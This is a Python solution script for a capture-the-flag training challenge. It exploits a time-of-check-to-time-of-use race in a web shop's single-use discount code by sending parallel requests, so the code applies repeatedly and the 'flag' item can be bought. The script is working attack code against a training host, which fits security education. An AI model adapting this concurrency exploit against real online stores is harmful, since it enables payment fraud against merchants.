# Race Condition Challenge, we gonna create a user, use the discount code available from the html page and buy the flag
# Problem we only have $5 dollars and the flag costs $10000 so we need to use the discount code multiple times because it is invalid after one use
# Then there is a TOCTOU vulnerability, we can use the discount code multiple times if we use it in the same time as the server is checking it

import requests
import threading
import time
import string
import random

base_url = "http://discount.training.offdef.it/"

def find_n(price): # How many times we need to use the discount code to get the flag
    n = 0
    while price > 5:
        price /= 2
        n += 1
    return n

def register(session, username, password):
    data = {
        "username": username,
        "password": password
    }
    r = session.post(base_url + "register", data=data)
    # Use your discount code! Code: IAMBIBT7J9</div>
    return r.text.split("Code: ")[1].split("</div>")[0]

def use_code(session, code):
    try:
        session.post(base_url + "apply_discount", data={"discount": code})
    except:
        pass


def add_to_cart(session, item_id):
    try:
        r = session.get(base_url + "add_to_cart?item_id=" + str(item_id), timeout = 0.00001)
    except:
        pass

def pay_and_check(session, username, password):
    session.get(base_url + "cart/pay")
    items = session.get(base_url + "items").text
    if "flag" in items:
        print('flag{' + items.split("flag{")[1].split("}")[0] + '}')
        print('Found flag with user: ' + username + ' and password: ' + password)

def fake_user():
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
    password = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
    return username, password

while True:
    s = requests.Session()

    username, password = fake_user()

    to_buy = 21 # The flag is item 21

    code = register(s, username, password)

    add_to_cart(s, to_buy)
    # We run in parallel multiple threads to use the discount code
    n = find_n(10000) # Number of threads to spawn

    threads = []

    for i in range(n):
        threads.append(threading.Thread(target=use_code, args=(s, code)))

    for t in threads:
        t.start()


    pay_and_check(s, username, password)

    time.sleep(0.1)